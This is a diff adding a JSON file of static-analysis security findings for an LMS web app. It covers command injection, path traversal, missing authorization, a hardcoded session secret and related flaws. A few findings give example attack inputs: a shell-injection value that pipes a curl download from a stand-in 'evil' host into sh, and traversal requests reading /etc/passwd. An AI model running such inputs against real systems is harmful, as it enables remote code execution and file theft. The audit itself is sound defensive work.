@@ -1,0 +1,310 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.injection.command-injection-pandoc",
+      "path": "src/lib/resource-convert.ts",
+      "start": {
+        "line": 11,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 11,
+        "col": 68,
+        "offset": 0
+      },
+      "extra": {
+        "message": "convertResourceFormat() builds a shell command by directly interpolating the caller-supplied sourcePath and format into a template string passed to execSync(), with no allowlist or shell-metacharacter escaping (unlike the sibling exportRubricDocument, which validates format against ALLOWED_RUBRIC_FORMATS and uses spawn with shell:false). It is called from POST /api/instructor/resources/convert (src/app/api/instructor/resources/convert/route.ts:18) with sourcePath and format taken verbatim from the authenticated request JSON body. An instructor or TA can submit sourcePath like \"a; curl http://evil/x|sh #\" or format containing backticks/$() to execute arbitrary OS commands on the server.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.upload-category",
+      "path": "src/lib/general-upload.ts",
+      "start": {
+        "line": 21,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 37,
+        "col": 68,
+        "offset": 0
+      },
+      "extra": {
+        "message": "storeGeneralAttachment() takes the 'category' form field directly from the request with no validation/allowlist and uses it to build the destination path via join(process.cwd(), UPLOAD_DIR, `${category}/${filename}`). Any authenticated user (POST /api/upload) can set category to a value like '../../../../tmp' so mkdir(recursive:true) and writeFile() create directories and write the uploaded file's bytes outside the intended uploads directory, achieving an arbitrary file write on the server.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal",
+            "CWE-73: External Control of File Name or Path"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.download-route",
+      "path": "src/app/api/download/[category]/[filename]/route.ts",
+      "start": {
+        "line": 19,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 19,
+        "col": 78,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The [category] and [filename] dynamic route segments are joined directly into a filesystem path (join(process.cwd(), UPLOAD_DIR, params.category, params.filename)) with no basename()/normalization/allowlist check, unlike sibling helpers in this codebase (e.g. fetchRosterSnapshot in src/lib/report-archive.ts, which applies basename() and verifies the resolved path stays inside the target directory). Any authenticated user can supply segments such as category='..' and filename containing traversal sequences (including doubly-encoded '..%2f') to read files outside the uploads directory.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.rubric-export-arbitrary-read",
+      "path": "src/app/api/instructor/resources/rubric-export/route.ts",
+      "start": {
+        "line": 43,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 51,
+        "col": 39,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The GET handler reads the 'outputPath' query parameter and passes it directly to readFile() with no validation that it resolves inside any expected directory (e.g. the CACHE_DIR/rubrics folder). Any authenticated instructor/TA can request GET /api/instructor/resources/rubric-export?outputPath=/etc/passwd&document_title=x to read arbitrary files readable by the server process.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal",
+            "CWE-73: External Control of File Name or Path"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.resource-note-title",
+      "path": "src/lib/resource-cache.ts",
+      "start": {
+        "line": 23,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 29,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "cacheResourceNote() builds a filesystem path from the caller-supplied 'category' and 'title' values with no sanitization (join(..., 'resource-notes', category, `${title}.txt`)). Both values come from the request body in createCourseResourceEntry() (src/lib/resource-cache.ts:76) with only an emptiness check, no character restrictions. An instructor/TA can set title to a value like '../../../../tmp/pwn' to write the note content to an arbitrary path outside the resource-notes directory; the corresponding GET handler in src/app/api/instructor/resources/route.ts:43 reads the file back the same unsanitized way, allowing arbitrary file read as well.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.auth.password-reset-no-expiry-check",
+      "path": "src/lib/password-reset.ts",
+      "start": {
+        "line": 43,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 50,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "confirmPasswordReset() only checks `!record || record.usedAt` before honoring a password-reset token and never validates `record.expiresAt` against the current time, so a reset link never expires (tokens are created with a 1-hour expiresAt in requestPasswordReset but that field is never enforced here). This is inconsistent with the analogous redeemEnrollmentInviteLink() (same file, line ~124) which correctly checks `record.expiresAt.getTime() < Date.now()`. An attacker who obtains an old/leaked reset token (e.g. from logs, a shared email, or a previous session) can use it indefinitely to take over the account.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-640: Weak Password Recovery Mechanism for Forgotten Password",
+            "CWE-613: Insufficient Session Expiration"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.discussion-thread-create-no-authz",
+      "path": "src/app/api/discussions/route.ts",
+      "start": {
+        "line": 9,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 30,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "POST creates a discussion thread using `body.courseId` taken directly from the request with no check that the authenticated user can access that course. The GET handler in the same file (and a prior fix commit f980321) added a canAccessCourse() check, but the POST path that actually creates threads for a courseId was never updated. Any authenticated user (e.g. a student in Course A) can supply an arbitrary courseId for Course B and post a discussion thread into a course they are not enrolled in or do not teach.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.discussion-comment-no-authz",
+      "path": "src/app/api/discussions/comments/route.ts",
+      "start": {
+        "line": 8,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 41,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "POST inserts a comment using `body.threadId` with no verification that the thread exists or that the user has access to its course (canAccessCourse/canTeachCourse is never called). Any authenticated user can post a comment onto any discussion thread ID, including threads belonging to courses they have no access to.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.data-exposure.sis-token-cleartext-get",
+      "path": "src/lib/sis-sync.ts",
+      "start": {
+        "line": 6,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 11,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "pushEnrollmentsToSis() sends the SIS integration token as a URL query parameter (`?token=${integrationToken}&cohortId=${cohortId}`) over SIS_BASE_URL, which defaults to a plaintext `http://` endpoint. This is inconsistent with pushCourseCatalogToSis() in the same file, which uses the `https://` SIS_SECURE_URL and sends the token via an Authorization header. Because this function is reached via GET /api/admin/enrollments/sync-status (src/app/api/admin/enrollments/sync-status/route.ts), the bearer token is exposed in cleartext on the wire and is also likely to be logged by intermediate proxies/servers since it is part of the URL.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-319: Cleartext Transmission of Sensitive Information",
+            "CWE-598: Use of GET Request Method With Sensitive Query Strings"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.info-exposure.export-stack-trace",
+      "path": "src/lib/export-diagnostics.ts",
+      "start": {
+        "line": 5,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 12,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "buildExportErrorResponse() returns the raw exception message and stack trace in the JSON response whenever the caller-controlled `detailLevel` equals 'full'. This is reachable via GET /api/admin/export?detail=full (src/app/api/admin/export/route.ts:115), which passes the `detail` query parameter straight through. Any caller who can hit this endpoint can trigger error paths and read internal stack traces (file paths, library versions, internal logic) instead of a generic error message.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.hardcoded-credentials.session-secret-default",
+      "path": "src/lib/auth.ts",
+      "start": {
+        "line": 19,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 19,
+        "col": 95,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The iron-session encryption password falls back to a hardcoded literal ('complex_password_at_least_32_characters_long_for_security') when SESSION_SECRET is not set in the environment. Since this value is committed in source, any deployment that omits SESSION_SECRET uses a publicly known key to encrypt/sign session cookies, letting an attacker forge arbitrary session cookies (including school_admin sessions).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.open-redirect.submission-return-header",
+      "path": "src/lib/continuity-link.ts",
+      "start": {
+        "line": 11,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 16,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resolveSubmissionReturnDestination() returns the caller-supplied `x-redirect-url` header value verbatim as the `returnTo` destination (src/app/api/student/submissions/route.ts:121), with no validation that it is a relative, in-app path. This is inconsistent with resolveCoursePreviewReturnDestination() in the same file, which restricts output to an explicit allowlist. If the client-side code redirects the browser to the returned `returnTo` value, an attacker who controls the `x-redirect-url` header (or a proxy embedding this LMS) can redirect a victim to an arbitrary external URL after submission.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-601: URL Redirection to Untrusted Site ('Open Redirect')"
+          ],
+          "confidence": "LOW",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
